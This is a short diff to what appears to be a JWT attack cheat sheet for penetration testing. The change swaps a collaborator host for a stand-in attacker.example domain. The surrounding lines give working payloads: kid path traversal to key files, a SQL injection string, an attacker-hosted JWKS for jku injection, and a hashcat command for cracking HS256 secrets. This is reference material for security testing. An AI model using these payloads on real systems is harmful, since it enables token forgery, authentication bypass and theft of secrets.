@@ -440,7 +440,7 @@ curl -H "Authorization: Bearer <CONFUSED_TOKEN>" https://target/api/me
 - File reference: `"kid":"/proc/sys/kernel/hostname"` or `"kid":"../../../../keys/prod.key"`
 - SQLi in lookup: `"kid":"' OR '1'='1"` when `kid` is interpolated into a query
 
-**jku / inline jwk** — host attacker JWKS at `https://YOUR-COLLABORATOR.oast.fun/jwks.json`, set `"jku"` to that URL, or embed an attacker RSA key in the `"jwk"` header field; re-sign and send if the server fetches/trusts header-supplied keys.
+**jku / inline jwk** — host attacker JWKS at `https://CANARY.attacker.example/jwks.json`, set `"jku"` to that URL, or embed an attacker RSA key in the `"jwk"` header field; re-sign and send if the server fetches/trusts header-supplied keys.
 
 **Weak HS256 secret** — offline crack captured token: `hashcat -m 16500 jwt.txt wordlist.txt`; re-sign with recovered secret and confirm server acceptance.
 
